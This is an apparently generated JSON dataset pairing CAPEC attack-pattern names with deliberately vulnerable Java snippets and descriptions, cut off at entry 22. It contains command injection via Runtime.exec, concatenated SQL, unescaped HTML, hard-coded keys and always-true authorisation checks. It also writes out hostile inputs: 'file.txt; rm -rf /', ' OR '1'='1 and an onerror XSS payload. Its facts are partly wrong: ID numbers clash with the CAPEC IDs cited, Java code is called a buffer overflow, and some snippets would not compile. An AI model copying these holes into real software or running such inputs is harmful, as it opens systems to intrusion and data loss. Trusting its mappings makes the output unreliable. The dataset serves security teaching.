[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/admin\")\npublic class AdminServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession();\n        String role = (String) session.getAttribute(\"role\");\n\n        // Improper Authorization Check\n        if (role == null || !role.equals(\"admin\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n            return;\n        }\n\n        // Sensitive functionality accessible without proper ACLs\n        response.getWriter().println(\"Welcome to the admin panel!\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a common vulnerability where access to sensitive functionality is not properly constrained by Access Control Lists (ACLs). The servlet is mapped to the '/admin' URL, which should only be accessible by users with an 'admin' role. However, the authorization check is performed in a simplistic and potentially flawed manner. If the 'role' attribute is not set or does not equal 'admin', access is denied. This check is vulnerable to several issues, such as session fixation or manipulation, and does not represent a robust ACL mechanism. The code snippet embodies the main idea of CAPEC-1220 (Accessing Functionality Not Properly Constrained by ACLs) and CWE-285 (Improper Authorization), highlighting the risk of unauthorized access to sensitive application functionality."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "public class AccountService {\n    private static final int MAX_ATTEMPTS = 3;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private Map<String, Boolean> accountLocked = new HashMap<>();\n\n    public boolean login(String username, String password) {\n        if (accountLocked.getOrDefault(username, false)) {\n            System.out.println(\"Account is locked.\");\n            return false;\n        }\n\n        if (authenticate(username, password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return true;\n        } else {\n            int attempts = loginAttempts.getOrDefault(username, 0) + 1;\n            loginAttempts.put(username, attempts);\n            if (attempts >= MAX_ATTEMPTS) {\n                accountLocked.put(username, true);\n                System.out.println(\"Account locked due to too many failed attempts.\");\n            }\n            return false;\n        }\n    }\n\n    private boolean authenticate(String username, String password) {\n        // Simulate authentication logic\n        return \"correct_password\".equals(password);\n    }\n\n    public void unlockAccount(String username) {\n        accountLocked.put(username, false);\n        loginAttempts.put(username, 0);\n        System.out.println(\"Account unlocked.\");\n    }\n\n    public static void main(String[] args) {\n        AccountService service = new AccountService();\n        service.login(\"user1\", \"wrong_password\");\n        service.login(\"user1\", \"wrong_password\");\n        service.login(\"user1\", \"wrong_password\"); // Account should be locked now\n        service.login(\"user1\", \"correct_password\"); // Should not be able to login\n        service.unlockAccount(\"user1\");\n        service.login(\"user1\", \"correct_password\"); // Should be able to login now\n    }\n}",
        "description": "This Java code snippet demonstrates an account lockout mechanism that can be exploited to induce a denial of service attack on a legitimate user. The `AccountService` class contains a method `login` that locks an account after three failed login attempts. The `authenticate` method simulates the authentication process. If the account is locked, the user cannot log in even with the correct password. The `unlockAccount` method is provided to unlock the account manually. This code embodies the CAPEC idea of 'Inducing Account Lockout' by leveraging the security feature (account lockout) to deny service to legitimate users. The related CWEs are represented by the overly restrictive lockout mechanism (CWE-645) and the improper restriction of excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import java.util.regex.Pattern;\n\npublic class InputFilter {\n    private static final Pattern DISALLOWED_PATTERN = Pattern.compile(\"[<>%$]\");\n\n    public static String filterInput(String input) {\n        // Early validation before canonicalization\n        if (DISALLOWED_PATTERN.matcher(input).find()) {\n            throw new IllegalArgumentException(\"Invalid input detected\");\n        }\n        // Canonicalization step\n        String canonicalInput = canonicalize(input);\n        // Further processing\n        return processInput(canonicalInput);\n    }\n\n    private static String canonicalize(String input) {\n        // Simulate canonicalization by removing leading ghost characters\n        return input.replaceAll(\"^\\p{C}+\", \"\");\n    }\n\n    private static String processInput(String input) {\n        // Simulate processing the input\n        return \"Processed: \" + input;\n    }\n\n    public static void main(String[] args) {\n        String userInput = \"\\u200B\\u200C\\u200DHelloWorld\"; // Leading ghost characters\n        try {\n            String result = filterInput(userInput);\n            System.out.println(result);\n        } catch (IllegalArgumentException e) {\n            System.err.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can be exploited using leading 'ghost' characters. The `filterInput` method first checks for disallowed characters using a regex pattern. However, this validation occurs before the input is canonicalized by removing leading ghost characters in the `canonicalize` method. An attacker can bypass the validation by introducing ghost characters that are stripped during canonicalization, allowing potentially harmful input to pass through. This example embodies the main idea of CAPEC-Using Leading 'Ghost' Character Sequences to Bypass Input Filters and highlights related CWEs such as improper input validation (CWE-20), incorrect behavior order (CWE-180), and improper handling of alternate encoding (CWE-173)."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.regex.Pattern;\n\npublic class IPAddressValidator {\n    private static final Pattern IP_PATTERN = Pattern.compile(\n            \"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\");\n\n    public static boolean isValidIPAddress(String ip) {\n        return IP_PATTERN.matcher(ip).matches();\n    }\n\n    public static boolean isTrustedIP(String ip) {\n        if (!isValidIPAddress(ip)) {\n            return false;\n        }\n        try {\n            InetAddress addr = InetAddress.getByName(ip);\n            String hostname = addr.getHostName();\n            InetAddress[] addresses = InetAddress.getAllByName(hostname);\n            for (InetAddress address : addresses) {\n                if (address.getHostAddress().equals(ip)) {\n                    return true;\n                }\n            }\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        String ip = \"192.168.1.1\";\n        if (isTrustedIP(ip)) {\n            System.out.println(\"Access granted for IP: \" + ip);\n        } else {\n            System.out.println(\"Access denied for IP: \" + ip);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of IP address validation and trust verification, embodying the main idea of CAPEC-273: Using Alternative IP Address Encodings. The code includes a method to validate the IP address format using a regular expression (CWE-173: Improper Handling of Alternate Encoding) and a method to verify if the IP address is trusted by performing reverse DNS resolution (CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action). The `isTrustedIP` method checks if the IP address resolves to a hostname and then verifies if the hostname resolves back to the same IP address, ensuring the IP address is truly associated with the hostname. This helps prevent bypassing access control by using alternative IP address encodings."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class BlueBoxingExample {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            System.out.println(\"New client connected\");\n\n            Scanner input = new Scanner(socket.getInputStream());\n            String message = input.nextLine();\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            if (message.equals(\"SUPERVISOR_TONE\")) {\n                // CWE-285: Improper Authorization\n                System.out.println(\"Supervisor access granted\");\n                // Perform administrative functions\n            } else {\n                System.out.println(\"Access denied\");\n            }\n\n            socket.close();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Blue Boxing attack. The server listens on port 8080 and accepts incoming connections. When a client sends a message, the server checks if the message is 'SUPERVISOR_TONE'. If it is, the server grants supervisor access and performs administrative functions without proper authorization checks (CWE-285). This represents the vulnerability where an attacker can send a specific tone to gain unauthorized access. Additionally, the code does not verify the source of the communication (CWE-940) or ensure the integrity of the message (CWE-924), making it susceptible to capture-replay attacks (CWE-294) and improper endpoint communication (CWE-923)."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ArgumentInjectionExample {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Please provide a command to execute.\");\n            return;\n        }\n\n        String command = args[0];\n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an example of Argument Injection vulnerability. The program takes a command as an argument from the user and executes it using the Runtime.getRuntime().exec() method. This is a classic example of CWE-78 (OS Command Injection) where user input is directly used to construct an OS command without any validation or neutralization of special elements. This can allow an attacker to inject malicious commands, changing the behavior or state of the application. The code also touches on CWE-74 and CWE-146, as it does not neutralize special elements or delimiters in the input, and CWE-184, as it does not implement a comprehensive list of disallowed inputs."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\nimport java.sql.SQLException;\n\npublic class BlindSQLInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n             Statement stmt = conn.createStatement()) {\n\n            ResultSet rs = stmt.executeQuery(query);\n\n            if (rs.next()) {\n                System.out.println(\"User exists.\");\n            } else {\n                System.out.println(\"User does not exist.\");\n            }\n        } catch (SQLException e) {\n            // Suppress detailed error messages\n            System.out.println(\"An error occurred.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Blind SQL Injection vulnerability. The code constructs an SQL query using user input without proper validation or neutralization, leading to potential SQL Injection. The query checks if a user exists in the database based on the provided username. An attacker can manipulate the input to always return true (e.g., ' OR '1'='1), bypassing authentication checks. The error messages are suppressed, but this alone is insufficient to prevent SQL Injection, as the attacker can still infer the success of the injection based on the application's behavior. This example highlights the importance of proper input validation and neutralization to prevent SQL Injection attacks."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import java.nio.ByteBuffer;\n\npublic class VulnerableLibrary {\n    public void vulnerableMethod(byte[] input) {\n        byte[] buffer = new byte[10]; // Fixed buffer size\n        System.arraycopy(input, 0, buffer, 0, input.length); // No size check\n    }\n\n    public static void main(String[] args) {\n        VulnerableLibrary lib = new VulnerableLibrary();\n        byte[] largeInput = new byte[20]; // Input larger than buffer\n        lib.vulnerableMethod(largeInput); // This will cause a buffer overflow\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability in an API call, which is the main idea of the CAPEC. The `vulnerableMethod` method copies an input byte array to a fixed-size buffer without checking if the input size exceeds the buffer size, leading to a buffer overflow. This example embodies CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The `main` method shows how an adversary could exploit this vulnerability by passing an input larger than the buffer, causing a buffer overflow."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class VulnerableCommandLineUtility {\n    public static void main(String[] args) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        char[] buffer = new char[256];\n        try {\n            System.out.print(\"Enter command: \");\n            int charsRead = reader.read(buffer);\n            String command = new String(buffer, 0, charsRead);\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable command-line utility that reads user input and executes it as a system command. The code demonstrates several weaknesses: \n1. CWE-120: The buffer size is fixed at 256 characters, but the code does not check if the input exceeds this size, leading to a potential buffer overflow.\n2. CWE-20: The input is not validated, allowing any input to be executed as a command, which can be exploited for command injection.\n3. CWE-74: Special characters in the input are not neutralized, which can modify the command's behavior when executed.\n4. CWE-119: The code performs operations on the buffer without ensuring it stays within bounds, risking out-of-bounds access.\n\nThe main idea of the CAPEC is to show how an adversary can exploit vulnerabilities in command-line utilities to escalate privileges, and this code snippet embodies that by allowing arbitrary command execution without proper validation or bounds checking."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import java.util.Map;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        // Get environment variable\n        String userInput = System.getenv(\"USER_INPUT\");\n\n        // Vulnerable buffer copy without checking size\n        char[] buffer = new char[10];\n        for (int i = 0; i < userInput.length(); i++) {\n            buffer[i] = userInput.charAt(i); // CWE-120: Buffer Copy without Checking Size of Input\n        }\n\n        // Print the buffer content\n        System.out.println(buffer);\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via environment variables, aligning with the CAPEC description. The code retrieves an environment variable 'USER_INPUT' and copies its content into a fixed-size buffer without checking the input size, leading to a potential buffer overflow (CWE-120). This example highlights the implicit trust placed in environment variables and the lack of proper input validation (CWE-20), which can be exploited by an attacker to cause a buffer overflow."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = getFileName(filePart);\n        String fileExtension = getFileExtension(fileName);\n\n        // Vulnerable: relying on file extension to determine file type\n        if (fileExtension.equals(\"txt\")) {\n            // Process as text file\n            processTextFile(filePart);\n        } else if (fileExtension.equals(\"jpg\")) {\n            // Process as image file\n            processImageFile(filePart);\n        } else {\n            // Default processing\n            processDefault(filePart);\n        }\n    }\n\n    private String getFileName(Part part) {\n        for (String content : part.getHeader(\"content-disposition\").split(\";\")) {\n            if (content.trim().startsWith(\"filename\")) {\n                return content.substring(content.indexOf('=') + 1).trim().replace(\"\\\"\", \"\");\n            }\n        }\n        return null;\n    }\n\n    private String getFileExtension(String fileName) {\n        if (fileName != null && fileName.contains(\".\")) {\n            return fileName.substring(fileName.lastIndexOf('.') + 1);\n        }\n        return \"\";\n    }\n\n    private void processTextFile(Part filePart) throws IOException {\n        // Process text file\n        InputStream fileContent = filePart.getInputStream();\n        // ...\n    }\n\n    private void processImageFile(Part filePart) throws IOException {\n        // Process image file\n        InputStream fileContent = filePart.getInputStream();\n        // ...\n    }\n\n    private void processDefault(Part filePart) throws IOException {\n        // Default processing\n        InputStream fileContent = filePart.getInputStream();\n        // ...\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload handling mechanism. The code relies on the file extension to determine how to process the uploaded file, which is a key aspect of the CAPEC 'Cause Web Server Misclassification'. This approach can be exploited by attackers to misclassify files and cause the server to take unintended actions. For example, an attacker could upload a file with a misleading extension to bypass security checks or trigger different processing logic. The code also highlights related CWEs, such as CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) and CWE-641 (Improper Restriction of Names for Files and Other Resources), by showing how the file name and extension are used without proper validation or restriction."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class MessageHandler {\n    private static final Map<String, String> clientMessages = new HashMap<>();\n    private static final String SECRET_KEY = \"sensitiveInfo123\";\n\n    static {\n        clientMessages.put(\"client1\", \"message1\");\n        clientMessages.put(\"client2\", \"message2\");\n    }\n\n    public static void main(String[] args) {\n        String clientId = \"client1\";\n        String message = getMessageForClient(clientId);\n        System.out.println(\"Received message: \" + message);\n    }\n\n    public static String getMessageForClient(String clientId) {\n        // CWE-306: Missing Authentication for Critical Function\n        // No authentication check for client identity\n        if (clientMessages.containsKey(clientId)) {\n            // CWE-201: Insertion of Sensitive Information Into Sent Data\n            // Including sensitive information in the message\n            return clientMessages.get(clientId) + \" \" + SECRET_KEY;\n        }\n        return \"No message for client\";\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable message handling system that embodies the main idea of CAPEC-Choosing Message Identifier. The code allows an adversary to select messages intended for another client by determining the parameter value assigned to that client. The vulnerabilities include: \n1. CWE-306: Missing Authentication for Critical Function - The code does not perform any authentication for the client identity, allowing unauthorized access to messages.\n2. CWE-201: Insertion of Sensitive Information Into Sent Data - The code includes sensitive information (SECRET_KEY) in the message sent to the client.\n\nThe `getMessageForClient` method retrieves a message for a given client ID without verifying the client's identity, and it appends sensitive information to the message. This can lead to unauthorized access to privileged information and potential impersonation attacks."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import java.io.IOException;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws IOException {\n        // CWE-20: Improper Input Validation\n        String userInput = System.getenv(\"USER_INPUT\");\n        if (userInput == null) {\n            userInput = \"default_value\";\n        }\n\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        String command = \"echo \" + userInput;\n        Runtime.getRuntime().exec(command);\n\n        // CWE-285: Improper Authorization\n        String adminToken = System.getenv(\"ADMIN_TOKEN\");\n        if (adminToken != null && adminToken.equals(\"hardcoded_token\")) {\n            System.out.println(\"Admin access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that embodies the main idea of CAPEC-15: Subverting Environment Variable Values. The code reads environment variables 'USER_INPUT' and 'ADMIN_TOKEN' without proper validation or sanitization. The 'USER_INPUT' variable is used directly in a command execution, leading to potential command injection (CWE-74). The 'ADMIN_TOKEN' variable is used for authorization without proper validation, leading to improper authorization (CWE-285). Additionally, the code does not validate the 'USER_INPUT' properly (CWE-20), which can lead to unexpected behavior. This snippet highlights how an adversary can manipulate environment variables to subvert the application's expected operation."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        byte[] buffer = new byte[50];\n        try {\n            // CWE-120: Buffer Copy without Checking Size of Input\n            System.arraycopy(userInput.getBytes(), 0, buffer, 0, userInput.length());\n            response.getWriter().println(\"Data processed: \" + new String(buffer));\n        } catch (ArrayIndexOutOfBoundsException e) {\n            response.getWriter().println(\"Error: Buffer overflow detected\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a client-side injection-induced buffer overflow vulnerability. The servlet reads a parameter 'input' from the HTTP request and copies it into a fixed-size buffer without checking the size of the input. This can lead to a buffer overflow if the input exceeds the buffer size. The code snippet embodies the main idea of CAPEC-Client-side Injection-induced Buffer Overflow and incorporates CWE-120 (Buffer Copy without Checking Size of Input). The vulnerability can be exploited by an attacker by sending a specially crafted request to the servlet, causing a buffer overflow and potentially leading to arbitrary code execution or other malicious actions."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.print(\"Enter a filename: \");\n            String filename = reader.readLine();\n\n            // Vulnerable code: concatenating user input directly into the command\n            String command = \"cat \" + filename;\n            Process process = Runtime.getRuntime().exec(command);\n\n            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = processReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The program reads a filename from user input and directly concatenates it into a shell command (`cat <filename>`). This approach is vulnerable to command injection attacks because an attacker can input a filename that includes command delimiters (e.g., `;`, `&&`) to execute arbitrary commands. For example, entering `file.txt; rm -rf /` would execute the `cat file.txt` command followed by the `rm -rf /` command, potentially causing significant damage. This code embodies the main idea of CAPEC-146 by showing how improper neutralization of command delimiters can lead to security vulnerabilities."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class DictionaryAttackExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Weak password requirements (CWE-521)\n        userDatabase.put(\"user1\", \"password\");\n        userDatabase.put(\"user2\", \"123456\");\n    }\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Improper restriction of excessive authentication attempts (CWE-307)\n        return userDatabase.containsKey(username) && userDatabase.get(username).equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication system that is vulnerable to dictionary-based password attacks. The user database contains weak passwords (CWE-521), and the authentication method does not implement any measures to prevent multiple failed authentication attempts (CWE-307). The code allows an attacker to try different passwords from a dictionary without any restriction, making it susceptible to dictionary attacks as described in the CAPEC. The code highlights the importance of strong password requirements and proper restriction of authentication attempts to mitigate such attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\nimport java.nio.file.attribute.PosixFilePermissions;\n\npublic class MaliciousFileExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-732: Incorrect Permission Assignment for Critical Resource\n            Path filePath = Paths.get(\"/tmp/uploadedFile.sh\");\n            Files.write(filePath, \"echo 'Malicious Code Execution'\".getBytes(), StandardOpenOption.CREATE);\n            Files.setPosixFilePermissions(filePath, PosixFilePermissions.fromString(\"rwxrwxrwx\"));\n\n            // CWE-285: Improper Authorization\n            if (isAuthorizedUser()) {\n                // CWE-272: Least Privilege Violation\n                executeFile(filePath);\n            } else {\n                System.out.println(\"Unauthorized access attempt detected.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isAuthorizedUser() {\n        // Simulate an authorization check\n        return true; // Insecure: Always returns true\n    }\n\n    private static void executeFile(Path filePath) throws IOException {\n        // CWE-270: Privilege Context Switching Error\n        ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", filePath.toString());\n        pb.inheritIO();\n        Process process = pb.start();\n        try {\n            process.waitFor();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a malicious file can be uploaded and executed on a system, embodying the main idea of the CAPEC 'Using Malicious Files'. The code includes several vulnerabilities: \n1. CWE-732: The file is created with overly permissive permissions (rwxrwxrwx), allowing any user to read, write, and execute it.\n2. CWE-285: The authorization check in 'isAuthorizedUser' is insecure as it always returns true, allowing unauthorized users to execute the file.\n3. CWE-272: The code does not drop elevated privileges after performing the necessary operations.\n4. CWE-270: The code does not properly manage privileges while switching contexts, potentially allowing privilege escalation.\nThis example highlights the risks associated with improper file permissions, inadequate authorization checks, and poor privilege management, which can lead to the execution of malicious files on a system."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userComment = request.getParameter(\"comment\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>User Comment</h1>\");\n        response.getWriter().println(\"<img src='\" + userComment + \"' />\"); // CWE-82: Improper Neutralization of Script in Attributes of IMG Tags\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where user input is directly embedded into an IMG tag's src attribute without proper sanitization. The 'userComment' parameter is taken from the HTTP request and inserted into the HTML response. This can lead to an XSS attack if an attacker provides a malicious script as the 'comment' parameter. For example, an attacker could input something like '\" onerror=\"alert('XSS')\"' which would execute a script when the image fails to load. This snippet embodies the main idea of CAPEC-139: XSS Targeting Non-Script Elements, and highlights CWE-82: Improper Neutralization of Script in Attributes of IMG Tags."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import java.io.*;\nimport javax.script.*;\n\npublic class VulnerableScriptExecutor {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableScriptExecutor <script>\");\n            return;\n        }\n\n        String script = args[0];\n        try {\n            // Read the script from a file\n            String scriptContent = new String(Files.readAllBytes(Paths.get(script)));\n\n            // Execute the script without proper validation\n            ScriptEngineManager manager = new ScriptEngineManager();\n            ScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n            engine.eval(scriptContent);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable script execution scenario. The program reads a script file specified by the user and executes it using the JavaScript engine without proper validation or sanitization. This embodies the CAPEC 'Embedding Scripts within Scripts' by allowing an adversary to embed malicious scripts within a script file that the program will execute. The related CWEs are represented as follows:\n- CWE-284 (Improper Access Control): The program does not restrict access to the script execution functionality, allowing any script to be executed.\n- CWE-79 (Cross-site Scripting): Although not directly a web application, the concept of executing untrusted input without neutralization is similar.\n- CWE-830 (Inclusion of Web Functionality from an Untrusted Source): The script content is included and executed without verifying its trustworthiness.\n- CWE-506 (Embedded Malicious Code): The script file could contain malicious code that gets executed by the program."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class WeakEncryptionExample {\n    private static final String ALGORITHM = \"AES\";\n    private static final String HARD_CODED_KEY = \"1234567890123456\"; // CWE-321: Hard-coded cryptographic key\n\n    public static void main(String[] args) {\n        try {\n            String plaintext = \"SensitiveData\";\n            String encryptedText = encrypt(plaintext);\n            System.out.println(\"Encrypted Text: \" + encryptedText);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String encrypt(String data) throws Exception {\n        SecretKeySpec key = new SecretKeySpec(HARD_CODED_KEY.getBytes(), ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a weak encryption implementation that is vulnerable to brute force attacks. The code uses AES encryption with a hard-coded cryptographic key (CWE-321), which significantly increases the risk of the key being discovered through brute force methods. The encryption algorithm used (AES) is theoretically sound, but the use of a hard-coded key and potentially inadequate key length (CWE-326) makes the encryption strength insufficient for protecting sensitive data. This example embodies the main idea of CAPEC-116 (Encryption Brute Forcing) by showing how an attacker could exploit weak encryption practices to recover plaintext data."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session = request.getSession(false);\n\n        if (session == null || !session.getId().equals(sessionId)) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Invalid session\");\n            return;\n        }\n\n        // Simulate sensitive action\n        response.getWriter().println(\"Sensitive action performed\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the 'Exploitation of Trusted Identifiers' CAPEC. The code retrieves a session ID from a request parameter and compares it with the current session ID without proper validation. This can lead to several issues described by the related CWEs:\n\n1. **CWE-290 (Authentication Bypass by Spoofing)**: An attacker can guess or obtain a valid session ID and use it to bypass authentication.\n2. **CWE-302 (Authentication Bypass by Assumed-Immutable Data)**: The session ID is assumed to be immutable and trusted, but it can be manipulated by an attacker.\n3. **CWE-346 (Origin Validation Error)**: The code does not properly verify the source of the session ID.\n4. **CWE-539 (Use of Persistent Cookies Containing Sensitive Information)**: If the session ID is stored in a persistent cookie, it can be stolen and reused.\n5. **CWE-384 (Session Fixation)**: The code does not invalidate the session ID, allowing an attacker to fixate a session.\n6. **CWE-602 (Client-Side Enforcement of Server-Side Security)**: The server relies on the client to provide a valid session ID, which can be manipulated.\n7. **CWE-642 (External Control of Critical State Data)**: The session ID, a critical state data, is controlled externally by the client.\n\nThis code snippet highlights the risks of trusting identifiers provided by the client without proper validation and control mechanisms."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
